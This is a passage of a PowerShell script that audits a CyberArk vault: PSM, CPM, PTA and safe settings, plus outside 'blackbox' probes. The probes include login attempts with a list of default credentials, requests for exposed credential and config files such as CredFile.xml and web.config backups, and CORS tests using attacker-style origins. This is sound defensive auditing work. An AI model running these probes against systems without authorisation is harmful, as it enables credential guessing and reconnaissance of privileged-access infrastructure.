    if ($psmConfig) {
        # Check: Recording enabled
        if ($psmConfig.RecordingEnabled -eq $false) {
            Add-Finding -Category "PSM Configuration" `
                -CISControl "V2.1" `
                -Finding "PSM session recording disabled" `
                -Resource "PSM Configuration" `
                -CurrentValue "Disabled" `
                -ExpectedValue "Enabled" `
                -Recommendation "Enable session recording for all PSM connections" `
                -Severity "Critical"
        }

        # Check: Recording encryption
        if ($psmConfig.RecordingEncryption -eq $false) {
            Add-Finding -Category "PSM Configuration" `
                -CISControl "V2.4" `
                -Finding "PSM recordings not encrypted" `
                -Resource "PSM Configuration" `
                -CurrentValue "Unencrypted" `
                -ExpectedValue "Encrypted" `
                -Recommendation "Enable encryption for session recordings" `
                -Severity "High"
        }

        # Check: Keystroke logging
        if ($psmConfig.KeystrokeLogging -eq $false) {
            Add-Finding -Category "PSM Configuration" `
                -CISControl "V2.2" `
                -Finding "Keystroke logging disabled" `
                -Resource "PSM Configuration" `
                -CurrentValue "Disabled" `
                -ExpectedValue "Enabled" `
                -Recommendation "Enable keystroke logging for audit trail" `
                -Severity "Medium"
        }
    }

    # Check Connection Components for PSM settings
    $connectionComponents = Invoke-CyberArkAPI -Endpoint "/ConnectionComponents"

    if ($connectionComponents) {
        foreach ($cc in $connectionComponents.ConnectionComponents) {
            $ccName = $cc.Name
            $ccId = $cc.Id

            # Get detailed component settings
            $ccDetails = Invoke-CyberArkAPI -Endpoint "/ConnectionComponents/$ccId"

            if ($ccDetails) {
                # Check: Clipboard disabled
                if ($ccDetails.AllowClipboard -eq $true) {
                    Add-Finding -Category "PSM Configuration" `
                        -CISControl "V2.3" `
                        -Finding "Clipboard access allowed in connection component" `
                        -Resource "Connection Component: $ccName" `
                        -CurrentValue "Enabled" `
                        -ExpectedValue "Disabled for secure connections" `
                        -Recommendation "Disable clipboard to prevent data exfiltration" `
                        -Severity "Medium"
                }

                # Check: Drive mapping
                if ($ccDetails.AllowDriveMapping -eq $true) {
                    Add-Finding -Category "PSM Configuration" `
                        -CISControl "V2.3" `
                        -Finding "Drive mapping allowed in connection component" `
                        -Resource "Connection Component: $ccName" `
                        -CurrentValue "Enabled" `
                        -ExpectedValue "Disabled for secure connections" `
                        -Recommendation "Disable drive mapping to prevent data transfer" `
                        -Severity "Medium"
                }
            }
        }
    }
}

function Test-AccountDiscovery {
    Write-AuditLog "Auditing Account Discovery (Vendor Best Practices)..." -Level Info

    # Check for pending accounts (discovered but not onboarded)
    $pendingAccounts = Invoke-CyberArkAPI -Endpoint "/DiscoveredAccounts?filter=status eq Pending&limit=$($script:Config.PageLimit)"

    if ($pendingAccounts -and $pendingAccounts.value) {
        $pendingCount = $pendingAccounts.value.Count
        $script:AuditStats.PendingAccounts = $pendingCount

        if ($pendingCount -gt 0) {
            Add-Finding -Category "Account Discovery" `
                -CISControl "V3.1" `
                -Finding "Pending discovered accounts not reviewed" `
                -Resource "Account Discovery" `
                -CurrentValue "$pendingCount pending accounts" `
                -ExpectedValue "All accounts reviewed and actioned" `
                -Recommendation "Review and onboard or exclude pending accounts" `
                -Severity "High"

            # Check age of oldest pending account
            $now = Get-Date
            foreach ($pending in $pendingAccounts.value | Select-Object -First 5) {
                if ($pending.discoveryDate) {
                    try {
                        $discoveryDate = [DateTime]::Parse($pending.discoveryDate)
                        $daysOld = ($now - $discoveryDate).Days

                        if ($daysOld -gt $script:Config.MaxPendingAccountAgeDays) {
                            Add-Finding -Category "Account Discovery" `
                                -CISControl "V3.1" `
                                -Finding "Pending account exceeds review threshold" `
                                -Resource "$($pending.userName)@$($pending.address)" `
                                -CurrentValue "$daysOld days pending" `
                                -ExpectedValue "Reviewed within $($script:Config.MaxPendingAccountAgeDays) days" `
                                -Recommendation "Immediately review and action this discovered account" `
                                -Severity "High"
                        }
                    }
                    catch { }
                }
            }
        }
    }

    # Check for discovery rules/scanners
    $scanners = Invoke-CyberArkAPI -Endpoint "/AutomaticOnboardingRules"

    if (-not $scanners -or $scanners.Count -eq 0) {
        Add-Finding -Category "Account Discovery" `
            -CISControl "V3.2" `
            -Finding "No automatic onboarding rules configured" `
            -Resource "Account Discovery" `
            -CurrentValue "No rules" `
            -ExpectedValue "Onboarding rules defined" `
            -Recommendation "Configure automatic onboarding rules for discovered accounts" `
            -Severity "Medium"
    }
}

function Test-PTAConfiguration {
    Write-AuditLog "Auditing PTA Configuration (Vendor Best Practices)..." -Level Info

    # Check PTA status via component monitoring
    $components = Invoke-CyberArkAPI -Endpoint "/ComponentsMonitoringDetails/all"
    $ptaComponent = $components.Components | Where-Object { $_.ComponentType -eq "PTA" }

    if (-not $ptaComponent) {
        Add-Finding -Category "Privileged Threat Analytics" `
            -CISControl "V4.1" `
            -Finding "PTA not detected in environment" `
            -Resource "PTA" `
            -CurrentValue "Not found" `
            -ExpectedValue "PTA deployed and active" `
            -Recommendation "Deploy Privileged Threat Analytics for anomaly detection" `
            -Severity "High"
    }
    else {
        if (-not $ptaComponent.IsLoggedOn) {
            Add-Finding -Category "Privileged Threat Analytics" `
                -CISControl "V4.1" `
                -Finding "PTA not connected" `
                -Resource $ptaComponent.ComponentName `
                -CurrentValue "Disconnected" `
                -ExpectedValue "Connected" `
                -Recommendation "Investigate PTA connectivity" `
                -Severity "Critical"
        }
    }

    # Check for security events/alerts
    $securityEvents = Invoke-CyberArkAPI -Endpoint "/SecurityEvents?limit=100"

    if ($securityEvents -and $securityEvents.SecurityEvents) {
        $unresolvedAlerts = $securityEvents.SecurityEvents | Where-Object { $_.status -ne "Resolved" }

        if ($unresolvedAlerts.Count -gt 0) {
            Add-Finding -Category "Privileged Threat Analytics" `
                -CISControl "V4.1" `
                -Finding "Unresolved security alerts detected" `
                -Resource "PTA Security Events" `
                -CurrentValue "$($unresolvedAlerts.Count) unresolved alerts" `
                -ExpectedValue "All alerts reviewed and resolved" `
                -Recommendation "Review and resolve PTA security alerts immediately" `
                -Severity "High"
        }

        # Check for specific high-risk event types
        $suspectedTheft = $securityEvents.SecurityEvents | Where-Object { $_.eventType -match "SuspectedCredentialTheft" }
        if ($suspectedTheft.Count -gt 0) {
            Add-Finding -Category "Privileged Threat Analytics" `
                -CISControl "V4.2" `
                -Finding "Suspected credential theft events detected" `
                -Resource "PTA Security Events" `
                -CurrentValue "$($suspectedTheft.Count) events" `
                -ExpectedValue "No credential theft" `
                -Recommendation "Investigate suspected credential theft immediately" `
                -Severity "Critical"
        }
    }
}

function Test-LinkedAccounts {
    Write-AuditLog "Auditing Linked Accounts (Vendor Best Practices)..." -Level Info

    $accounts = Invoke-CyberArkAPI -Endpoint "/Accounts?limit=$($script:Config.PageLimit)"
    if (-not $accounts) {
        Add-SkippedCheck -Category "Linked Accounts" -CISControl "V6.1" `
            -CheckName "Linked Accounts Audit" `
            -Reason "Could not retrieve accounts from API" `
            -Type "Error"
        return
    }

    $accountsWithoutLogon = 0
    $accountsWithoutReconcile = 0

    foreach ($account in $accounts.value) {
        $accountName = $account.name
        $safeName = $account.safeName
        $platformId = $account.platformId

        # Skip accounts that don't require linked accounts (e.g., certain platform types)
        if ($platformId -match "^(Unix|Linux|Windows)") {
            # Check for logon account
            if (-not $account.logonAccountId -and -not $account.logonAccountName) {
                $accountsWithoutLogon++
            }

            # Check for reconcile account
            if (-not $account.reconcileAccountId -and -not $account.reconcileAccountName) {
                $accountsWithoutReconcile++
            }
        }
    }

    if ($accountsWithoutLogon -gt 0) {
        Add-Finding -Category "Linked Accounts" `
            -CISControl "V6.1" `
            -Finding "Accounts without logon account configured" `
            -Resource "Linked Account Configuration" `
            -CurrentValue "$accountsWithoutLogon accounts" `
            -ExpectedValue "All accounts with logon account" `
            -Recommendation "Configure logon accounts for secure credential verification" `
            -Severity "Medium"
    }

    if ($accountsWithoutReconcile -gt 0) {
        Add-Finding -Category "Linked Accounts" `
            -CISControl "V6.2" `
            -Finding "Accounts without reconcile account configured" `
            -Resource "Linked Account Configuration" `
            -CurrentValue "$accountsWithoutReconcile accounts" `
            -ExpectedValue "All accounts with reconcile account" `
            -Recommendation "Configure reconcile accounts for password recovery" `
            -Severity "Medium"
    }
}

function Test-PVWASecurity {
    Write-AuditLog "Auditing PVWA Security Headers (Vendor Best Practices)..." -Level Info

    try {
        # Make a request to PVWA to check security headers
        $response = Invoke-WebRequest -Uri "$PVWA/PasswordVault/v10/logon" -Method HEAD -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue

        $headers = $response.Headers

        # Check: Strict-Transport-Security
        if (-not $headers["Strict-Transport-Security"]) {
            Add-Finding -Category "PVWA Security" `
                -CISControl "V7.1" `
                -Finding "HSTS header not present" `
                -Resource "PVWA Web Server" `
                -CurrentValue "Missing" `
                -ExpectedValue "Strict-Transport-Security header" `
                -Recommendation "Enable HSTS to enforce HTTPS connections" `
                -Severity "High"
        }

        # Check: X-Frame-Options
        if (-not $headers["X-Frame-Options"]) {
            Add-Finding -Category "PVWA Security" `
                -CISControl "V7.1" `
                -Finding "X-Frame-Options header not present" `
                -Resource "PVWA Web Server" `
                -CurrentValue "Missing" `
                -ExpectedValue "X-Frame-Options: DENY" `
                -Recommendation "Add X-Frame-Options header to prevent clickjacking" `
                -Severity "Medium"
        }
        elseif ($headers["X-Frame-Options"] -ne "DENY" -and $headers["X-Frame-Options"] -ne "SAMEORIGIN") {
            Add-Finding -Category "PVWA Security" `
                -CISControl "V7.1" `
                -Finding "Weak X-Frame-Options value" `
                -Resource "PVWA Web Server" `
                -CurrentValue $headers["X-Frame-Options"] `
                -ExpectedValue "DENY or SAMEORIGIN" `
                -Recommendation "Set X-Frame-Options to DENY" `
                -Severity "Medium"
        }

        # Check: X-Content-Type-Options
        if (-not $headers["X-Content-Type-Options"]) {
            Add-Finding -Category "PVWA Security" `
                -CISControl "V7.1" `
                -Finding "X-Content-Type-Options header not present" `
                -Resource "PVWA Web Server" `
                -CurrentValue "Missing" `
                -ExpectedValue "X-Content-Type-Options: nosniff" `
                -Recommendation "Add X-Content-Type-Options header" `
                -Severity "Low"
        }

        # Check: Content-Security-Policy
        if (-not $headers["Content-Security-Policy"]) {
            Add-Finding -Category "PVWA Security" `
                -CISControl "V7.1" `
                -Finding "Content-Security-Policy header not present" `
                -Resource "PVWA Web Server" `
                -CurrentValue "Missing" `
                -ExpectedValue "CSP header defined" `
                -Recommendation "Configure Content-Security-Policy header" `
                -Severity "Medium"
        }

        # Check: Server header disclosure
        if ($headers["Server"]) {
            Add-Finding -Category "PVWA Security" `
                -CISControl "V7.1" `
                -Finding "Server header exposes version information" `
                -Resource "PVWA Web Server" `
                -CurrentValue $headers["Server"] `
                -ExpectedValue "Header removed or generic" `
                -Recommendation "Remove or obfuscate Server header" `
                -Severity "Low"
        }
    }
    catch {
        Add-SkippedCheck -Category "PVWA Security" -CISControl "V7.1" `
            -CheckName "PVWA Security Headers Check" `
            -Reason "Could not check PVWA security headers: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-CPMConfiguration {
    Write-AuditLog "Auditing CPM Configuration (Vendor Best Practices)..." -Level Info

    # Get CPM servers
    $components = Invoke-CyberArkAPI -Endpoint "/ComponentsMonitoringDetails/all"
    $cpmServers = $components.Components | Where-Object { $_.ComponentType -eq "CPM" }

    if (-not $cpmServers) {
        Add-Finding -Category "CPM Configuration" `
            -CISControl "V8.1" `
            -Finding "No CPM detected in environment" `
            -Resource "CPM" `
            -CurrentValue "Not found" `
            -ExpectedValue "CPM deployed and active" `
            -Recommendation "Deploy Central Policy Manager for password management" `
            -Severity "Critical"
        return
    }

    foreach ($cpm in $cpmServers) {
        $cpmName = $cpm.ComponentName

        # Check CPM connectivity
        if (-not $cpm.IsLoggedOn) {
            Add-Finding -Category "CPM Configuration" `
                -CISControl "V8.1" `
                -Finding "CPM not connected to vault" `
                -Resource $cpmName `
                -CurrentValue "Disconnected" `
                -ExpectedValue "Connected" `
                -Recommendation "Investigate CPM connectivity immediately" `
                -Severity "Critical"
        }

        # Check last activity
        if ($cpm.LastLogonDate) {
            try {
                $lastActive = [DateTime]::Parse($cpm.LastLogonDate)
                $hoursSinceActive = ((Get-Date) - $lastActive).TotalHours

                if ($hoursSinceActive -gt 1) {
                    Add-Finding -Category "CPM Configuration" `
                        -CISControl "V8.1" `
                        -Finding "CPM inactive for extended period" `
                        -Resource $cpmName `
                        -CurrentValue "$([math]::Round($hoursSinceActive, 1)) hours since last activity" `
                        -ExpectedValue "Active within 1 hour" `
                        -Recommendation "Check CPM service health and logs" `
                        -Severity "High"
                }
            }
            catch { }
        }
    }
}

function Test-SafeDualControl {
    Write-AuditLog "Auditing Safe Dual Control Settings (Vendor Best Practices)..." -Level Info

    $safes = Invoke-CyberArkAPI -Endpoint "/Safes?limit=$($script:Config.PageLimit)"
    if (-not $safes) {
        Add-SkippedCheck -Category "Safe Configuration" -CISControl "3.3" `
            -CheckName "Safe Dual Control Audit" `
            -Reason "Could not retrieve safes from API" `
            -Type "Error"
        return
    }

    $sensitiveSafePatterns = @("Prod", "Production", "Admin", "Root", "Domain", "Enterprise", "Tier0", "Tier-0")

    foreach ($safe in $safes.value) {
        $safeName = $safe.safeName

        # Skip system safes
        if ($safeName -match "^(System|Notification|VaultInternal|PasswordManager)") {
            continue
        }

        # Check if this appears to be a sensitive safe
        $isSensitive = $false
        foreach ($pattern in $sensitiveSafePatterns) {
            if ($safeName -match $pattern) {
                $isSensitive = $true
                break
            }
        }

        if ($isSensitive) {
            $safeDetails = Invoke-CyberArkAPI -Endpoint "/Safes/$safeName"

            if ($safeDetails) {
                # Check dual control settings
                if (-not $safeDetails.requireDualControl) {
                    Add-Finding -Category "Safe Configuration" `
                        -CISControl "3.3" `
                        -Finding "Sensitive safe without dual control" `
                        -Resource $safeName `
                        -CurrentValue "Dual control disabled" `
                        -ExpectedValue "Dual control enabled for sensitive safes" `
                        -Recommendation "Enable dual control approval for this safe" `
                        -Severity "High"
                }
            }
        }
    }
}

function Test-AccountGroups {
    Write-AuditLog "Auditing Account Groups (Vendor Best Practices)..." -Level Info

    $accountGroups = Invoke-CyberArkAPI -Endpoint "/AccountGroups"

    if (-not $accountGroups -or $accountGroups.Count -eq 0) {
        Add-Finding -Category "Account Management" `
            -CISControl "4.1" `
            -Finding "No account groups configured" `
            -Resource "Account Groups" `
            -CurrentValue "No groups" `
            -ExpectedValue "Account groups for related credentials" `
            -Recommendation "Consider using account groups for related service accounts" `
            -Severity "Low"
    }
}

#======================================================================
# BLACKBOX / EXTERNAL SECURITY CHECKS
#======================================================================

function Test-ExposedEndpoints {
    Write-AuditLog "Checking for exposed/sensitive endpoints (Blackbox)..." -Level Info

    # Known sensitive paths that should not be accessible
    $sensitiveEndpoints = @(
        @{ Path = "/PasswordVault/WebServices/PIMServices.svc"; Desc = "Legacy SOAP API"; Severity = "Medium" },
        @{ Path = "/PasswordVault/WebServices/auth/Cyberark/CyberArkAuthenticationService.svc"; Desc = "Legacy Auth Service"; Severity = "Medium" },
        @{ Path = "/PasswordVault/v10/swagger"; Desc = "Swagger API Documentation"; Severity = "High" },
        @{ Path = "/PasswordVault/API/swagger"; Desc = "Swagger API Documentation"; Severity = "High" },
        @{ Path = "/PasswordVault/api/swagger.json"; Desc = "Swagger JSON Schema"; Severity = "High" },
        @{ Path = "/PasswordVault/api/openapi.json"; Desc = "OpenAPI Schema"; Severity = "High" },
        @{ Path = "/PasswordVault/docs"; Desc = "API Documentation"; Severity = "Medium" },
        @{ Path = "/PasswordVault/help"; Desc = "Help Documentation"; Severity = "Low" },
        @{ Path = "/PasswordVault/WebConsole"; Desc = "Web Console"; Severity = "Medium" },
        @{ Path = "/PasswordVault/v10/configuration"; Desc = "Configuration Endpoint"; Severity = "High" },
        @{ Path = "/PasswordVault/api/Configuration"; Desc = "Configuration API"; Severity = "High" },
        @{ Path = "/PasswordVault/api/ServerInfo"; Desc = "Server Information"; Severity = "Medium" },
        @{ Path = "/PasswordVault/api/server"; Desc = "Server Details"; Severity = "Medium" },
        @{ Path = "/PasswordVault/api/ComponentsMonitoringDetails"; Desc = "Component Details (unauth)"; Severity = "Critical" },
        @{ Path = "/PasswordVault/v10/healthcheck"; Desc = "Health Check Endpoint"; Severity = "Low" },
        @{ Path = "/PasswordVault/api/health"; Desc = "Health API"; Severity = "Low" },
        @{ Path = "/PasswordVault/Services/Status"; Desc = "Service Status"; Severity = "Medium" },
        @{ Path = "/PasswordVault/WebServices/Status.aspx"; Desc = "Legacy Status Page"; Severity = "Medium" }
    )

    foreach ($endpoint in $sensitiveEndpoints) {
        try {
            $response = Invoke-WebRequest -Uri "$PVWA$($endpoint.Path)" -Method GET -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue

            if ($response.StatusCode -eq 200) {
                Add-Finding -Category "Exposed Endpoints" `
                    -CISControl "BB1" `
                    -Finding "Sensitive endpoint accessible without authentication" `
                    -Resource $endpoint.Path `
                    -CurrentValue "HTTP 200 - Accessible" `
                    -ExpectedValue "HTTP 401/403 or not found" `
                    -Recommendation "Restrict access to $($endpoint.Desc)" `
                    -Severity $endpoint.Severity
            }
        }
        catch {
            # Expected - endpoint should not be accessible
        }
    }
}

function Test-InformationDisclosure {
    Write-AuditLog "Checking for information disclosure (Blackbox)..." -Level Info

    # Check various endpoints for version/info disclosure
    $infoEndpoints = @(
        "/PasswordVault/",
        "/PasswordVault/v10/logon",
        "/PasswordVault/api/auth",
        "/PasswordVault/WebServices/"
    )

    foreach ($endpoint in $infoEndpoints) {
        try {
            $response = Invoke-WebRequest -Uri "$PVWA$endpoint" -Method GET -UseBasicParsing -TimeoutSec 10 -ErrorAction Stop

            # Check response body for version info
            $body = $response.Content

            # Look for version patterns
            if ($body -match "version[`"'\s:]+(\d+\.\d+[\.\d]*)" -or
                $body -match "CyberArk[`"'\s:]+(\d+\.\d+)" -or
                $body -match "PVWA[`"'\s:]+(\d+\.\d+)") {
                Add-Finding -Category "Information Disclosure" `
                    -CISControl "BB2" `
                    -Finding "Version information disclosed in response" `
                    -Resource $endpoint `
                    -CurrentValue "Version pattern found in response body" `
                    -ExpectedValue "No version disclosure" `
                    -Recommendation "Remove version information from responses" `
                    -Severity "Medium"
            }

            # Check for stack traces or debug info
            if ($body -match "Exception|StackTrace|System\.|Microsoft\.|at \w+\.\w+\(" ) {
                Add-Finding -Category "Information Disclosure" `
                    -CISControl "BB2" `
                    -Finding "Debug/error information exposed" `
                    -Resource $endpoint `
                    -CurrentValue "Stack trace or debug info found" `
                    -ExpectedValue "Generic error messages only" `
                    -Recommendation "Disable detailed error messages in production" `
                    -Severity "High"
            }
        }
        catch {
            # Check error response for info disclosure
            $errorResponse = $_.Exception.Response
            if ($errorResponse) {
                try {
                    $reader = New-Object System.IO.StreamReader($errorResponse.GetResponseStream())
                    $errorBody = $reader.ReadToEnd()

                    if ($errorBody -match "Exception|StackTrace|System\.|Microsoft\." ) {
                        Add-Finding -Category "Information Disclosure" `
                            -CISControl "BB2" `
                            -Finding "Error response contains debug information" `
                            -Resource $endpoint `
                            -CurrentValue "Stack trace in error response" `
                            -ExpectedValue "Generic error messages" `
                            -Recommendation "Configure custom error pages" `
                            -Severity "Medium"
                    }
                }
                catch { }
            }
        }
    }

    # Check for ASP.NET/IIS version disclosure
    try {
        $response = Invoke-WebRequest -Uri "$PVWA/PasswordVault/" -Method GET -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
        $headers = $response.Headers

        if ($headers["X-AspNet-Version"]) {
            Add-Finding -Category "Information Disclosure" `
                -CISControl "BB2" `
                -Finding "ASP.NET version disclosed" `
                -Resource "HTTP Headers" `
                -CurrentValue "X-AspNet-Version: $($headers["X-AspNet-Version"])" `
                -ExpectedValue "Header removed" `
                -Recommendation "Remove X-AspNet-Version header in web.config" `
                -Severity "Low"
        }

        if ($headers["X-Powered-By"]) {
            Add-Finding -Category "Information Disclosure" `
                -CISControl "BB2" `
                -Finding "X-Powered-By header present" `
                -Resource "HTTP Headers" `
                -CurrentValue "X-Powered-By: $($headers["X-Powered-By"])" `
                -ExpectedValue "Header removed" `
                -Recommendation "Remove X-Powered-By header" `
                -Severity "Low"
        }
    }
    catch { 
        Write-VerboseError -Context "Header disclosure check" -ErrorRecord $_
    }
}

function Test-DefaultCredentials {
    Write-AuditLog "Checking for default/weak credential acceptance (Blackbox)..." -Level Info

    # Common default credentials to test
    $defaultCreds = @(
        @{ User = "Administrator"; Pass = "Cyberark1" },
        @{ User = "Administrator"; Pass = "CyberArk1!" },
        @{ User = "Administrator"; Pass = "Password1" },
        @{ User = "Administrator"; Pass = "Admin123" },
        @{ User = "admin"; Pass = "admin" },
        @{ User = "Auditor"; Pass = "Cyberark1" },
        @{ User = "PVWAGWUser"; Pass = "Cyberark1" },
        @{ User = "PasswordManager"; Pass = "Cyberark1" }
    )

    foreach ($cred in $defaultCreds) {
        try {
            $body = @{
                username = $cred.User
                password = $cred.Pass
            } | ConvertTo-Json

            $response = Invoke-RestMethod -Uri "$PVWA/PasswordVault/api/Auth/CyberArk/Logon" `
                -Method POST -Body $body -ContentType "application/json" -TimeoutSec 10 -ErrorAction Stop

            # If we get here, authentication succeeded with default creds!
            Add-Finding -Category "Default Credentials" `
                -CISControl "BB3" `
                -Finding "Default credentials accepted" `
                -Resource "Authentication" `
                -CurrentValue "User '$($cred.User)' with default password" `
                -ExpectedValue "No default credentials" `
                -Recommendation "Immediately change password for $($cred.User)" `
                -Severity "Critical"

            # Log off immediately
            try {
                Invoke-RestMethod -Uri "$PVWA/PasswordVault/api/Auth/Logoff" -Method POST -Headers @{Authorization = $response} -ErrorAction SilentlyContinue
            }
            catch { }
        }
        catch {
            # Expected - authentication should fail
        }
    }
}

function Test-HTTPMethods {
    Write-AuditLog "Checking for dangerous HTTP methods (Blackbox)..." -Level Info

    $dangerousMethods = @("PUT", "DELETE", "TRACE", "CONNECT", "PATCH")
    $testEndpoints = @(
        "/PasswordVault/",
        "/PasswordVault/v10/",
        "/PasswordVault/api/"
    )

    foreach ($endpoint in $testEndpoints) {
        foreach ($method in $dangerousMethods) {
            try {
                $response = Invoke-WebRequest -Uri "$PVWA$endpoint" -Method $method -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue

                if ($response.StatusCode -ne 405 -and $response.StatusCode -ne 501) {
                    Add-Finding -Category "HTTP Methods" `
                        -CISControl "BB4" `
                        -Finding "Potentially dangerous HTTP method allowed" `
                        -Resource "$endpoint" `
                        -CurrentValue "$method returns HTTP $($response.StatusCode)" `
                        -ExpectedValue "HTTP 405 Method Not Allowed" `
                        -Recommendation "Disable $method method on web server" `
                        -Severity "Medium"
                }
            }
            catch {
                # Check if it's a method not allowed response (expected)
                if ($_.Exception.Response.StatusCode -ne 405 -and
                    $_.Exception.Response.StatusCode -ne 501 -and
                    $_.Exception.Response.StatusCode -ne 401 -and
                    $_.Exception.Response.StatusCode -ne 403) {
                    # Unexpected response
                }
            }
        }

        # Special check for TRACE (XST vulnerability)
        try {
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $uri = [System.Uri]$PVWA
            $tcpClient.Connect($uri.Host, $uri.Port)
            $stream = $tcpClient.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $reader = New-Object System.IO.StreamReader($stream)

            $writer.WriteLine("TRACE $endpoint HTTP/1.1")
            $writer.WriteLine("Host: $($uri.Host)")
            $writer.WriteLine("")
            $writer.Flush()

            Start-Sleep -Milliseconds 500
            $response = ""
            while ($stream.DataAvailable) {
                $response += $reader.ReadLine()
            }

            if ($response -match "HTTP/1\.[01] 200") {
                Add-Finding -Category "HTTP Methods" `
                    -CISControl "BB4" `
                    -Finding "TRACE method enabled (XST vulnerability)" `
                    -Resource $endpoint `
                    -CurrentValue "TRACE returns HTTP 200" `
                    -ExpectedValue "TRACE disabled" `
                    -Recommendation "Disable TRACE method to prevent XST attacks" `
                    -Severity "High"
            }

            $tcpClient.Close()
        }
        catch { 
            Write-VerboseError -Context "TRACE method test for $endpoint" -ErrorRecord $_
        }
    }
}

function Test-CookieSecurity {
    Write-AuditLog "Checking cookie security attributes (Blackbox)..." -Level Info

    try {
        # Make a request that would set cookies
        $response = Invoke-WebRequest -Uri "$PVWA/PasswordVault/" -Method GET -UseBasicParsing -TimeoutSec 10 -SessionVariable session -ErrorAction SilentlyContinue

        if ($session.Cookies.Count -gt 0) {
            foreach ($cookie in $session.Cookies.GetCookies("$PVWA")) {
                $issues = @()

                if (-not $cookie.Secure) {
                    $issues += "Missing Secure flag"
                }

                if (-not $cookie.HttpOnly) {
                    $issues += "Missing HttpOnly flag"
                }

                if ($issues.Count -gt 0) {
                    Add-Finding -Category "Cookie Security" `
                        -CISControl "BB5" `
                        -Finding "Cookie missing security attributes" `
                        -Resource "Cookie: $($cookie.Name)" `
                        -CurrentValue ($issues -join ", ") `
                        -ExpectedValue "Secure; HttpOnly; SameSite=Strict" `
                        -Recommendation "Add security attributes to session cookies" `
                        -Severity "Medium"
                }
            }
        }

        # Also check Set-Cookie headers directly
        $setCookieHeaders = $response.Headers["Set-Cookie"]
        if ($setCookieHeaders) {
            foreach ($cookieHeader in $setCookieHeaders) {
                $issues = @()

                if ($cookieHeader -notmatch "Secure") {
                    $issues += "Missing Secure"
                }
                if ($cookieHeader -notmatch "HttpOnly") {
                    $issues += "Missing HttpOnly"
                }
                if ($cookieHeader -notmatch "SameSite") {
                    $issues += "Missing SameSite"
                }

                if ($issues.Count -gt 0) {
                    $cookieName = if ($cookieHeader -match "^([^=]+)=") { $matches[1] } else { "Unknown" }
                    Add-Finding -Category "Cookie Security" `
                        -CISControl "BB5" `
                        -Finding "Set-Cookie header missing security attributes" `
                        -Resource "Cookie: $cookieName" `
                        -CurrentValue ($issues -join ", ") `
                        -ExpectedValue "Secure; HttpOnly; SameSite=Strict" `
                        -Recommendation "Configure secure cookie attributes" `
                        -Severity "Medium"
                }
            }
        }
    }
    catch { }
}

function Test-CORSConfiguration {
    Write-AuditLog "Checking CORS configuration (Blackbox)..." -Level Info

    $testOrigins = @(
        "https://evil.com",
        "https://attacker.com",
        "null"
    )

    foreach ($origin in $testOrigins) {
        try {
            $headers = @{
                "Origin" = $origin
            }

            $response = Invoke-OPSECWebRequest -Uri "$PVWA/PasswordVault/api/auth" -Method OPTIONS -Headers $headers -TimeoutSec 10 -ReturnFullResponse

            $allowOrigin = $response.Headers["Access-Control-Allow-Origin"]
            $allowCredentials = $response.Headers["Access-Control-Allow-Credentials"]

            if ($allowOrigin -eq "*") {
                Add-Finding -Category "CORS Configuration" `
                    -CISControl "BB6" `
                    -Finding "CORS allows any origin" `
                    -Resource "CORS Policy" `
                    -CurrentValue "Access-Control-Allow-Origin: *" `
                    -ExpectedValue "Specific trusted origins only" `
                    -Recommendation "Restrict CORS to trusted origins" `
                    -Severity "High"
            }
            elseif ($allowOrigin -eq $origin -and $origin -ne "null") {
                Add-Finding -Category "CORS Configuration" `
                    -CISControl "BB6" `
                    -Finding "CORS reflects arbitrary origin" `
                    -Resource "CORS Policy" `
                    -CurrentValue "Reflects: $origin" `
                    -ExpectedValue "Whitelist of trusted origins" `
                    -Recommendation "Implement strict origin whitelist" `
                    -Severity "High"
            }

            if ($allowCredentials -eq "true" -and ($allowOrigin -eq "*" -or $allowOrigin -eq $origin)) {
                Add-Finding -Category "CORS Configuration" `
                    -CISControl "BB6" `
                    -Finding "CORS allows credentials with permissive origin" `
                    -Resource "CORS Policy" `
                    -CurrentValue "Allow-Credentials: true with $allowOrigin" `
                    -ExpectedValue "Credentials only with trusted origins" `
                    -Recommendation "Restrict credentials to specific trusted origins" `
                    -Severity "Critical"
            }
        }
        catch { }
    }
}

function Test-BackupAndConfigFiles {
    Write-AuditLog "Checking for exposed backup/config files (Blackbox)..." -Level Info

    $sensitiveFiles = @(
        # Backup files
        @{ Path = "/PasswordVault/web.config.bak"; Desc = "Web.config backup" },
        @{ Path = "/PasswordVault/web.config.old"; Desc = "Web.config old version" },
        @{ Path = "/PasswordVault/web.config~"; Desc = "Web.config temp" },
        @{ Path = "/PasswordVault/web.config.save"; Desc = "Web.config save" },
        @{ Path = "/PasswordVault/web.config.txt"; Desc = "Web.config as text" },
        @{ Path = "/web.config"; Desc = "Root web.config" },
        # Configuration files
        @{ Path = "/PasswordVault/PVConfiguration.xml"; Desc = "PV Configuration" },
        @{ Path = "/PasswordVault/Vault.ini"; Desc = "Vault INI file" },
        @{ Path = "/PasswordVault/DBParm.ini"; Desc = "DB Parameters" },
        @{ Path = "/PasswordVault/padr.ini"; Desc = "PADR config" },
        @{ Path = "/PasswordVault/Policies.xml"; Desc = "Policies XML" },
        @{ Path = "/PasswordVault/CredFile.xml"; Desc = "Credential file" },
        @{ Path = "/PasswordVault/user.ini"; Desc = "User config" },
        # Log files
        @{ Path = "/PasswordVault/Logs/"; Desc = "Log directory" },
        @{ Path = "/PasswordVault/logs/"; Desc = "Log directory (lowercase)" },
        @{ Path = "/PasswordVault/ITALog.log"; Desc = "ITA Log file" },
        @{ Path = "/PasswordVault/pm_error.log"; Desc = "PM Error log" },
        @{ Path = "/PasswordVault/PMConsole.log"; Desc = "PM Console log" },
        @{ Path = "/PasswordVault/CACPMScanner.log"; Desc = "Scanner log" },
        # Temporary files
        @{ Path = "/PasswordVault/temp/"; Desc = "Temp directory" },
        @{ Path = "/PasswordVault/tmp/"; Desc = "Tmp directory" },
        # Common web files
        @{ Path = "/PasswordVault/.htaccess"; Desc = "htaccess file" },
        @{ Path = "/PasswordVault/.git/config"; Desc = "Git config" },
        @{ Path = "/PasswordVault/.svn/entries"; Desc = "SVN entries" },
        @{ Path = "/PasswordVault/CHANGELOG.md"; Desc = "Changelog" },
        @{ Path = "/PasswordVault/README.md"; Desc = "Readme" },
        @{ Path = "/PasswordVault/package.json"; Desc = "Package.json" },
